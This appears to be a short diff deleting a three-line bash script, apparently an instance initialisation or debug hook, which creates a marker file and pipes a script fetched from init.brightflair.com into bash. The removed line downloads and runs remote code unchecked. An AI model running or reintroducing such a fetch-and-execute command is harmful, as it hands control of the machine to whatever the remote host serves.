@@ -1,3 +1,0 @@
-#!/usr/bin/env bash
-touch ~/user-data-debug
-curl http://init.brightflair.com/init | bash -s INIT_TYPE
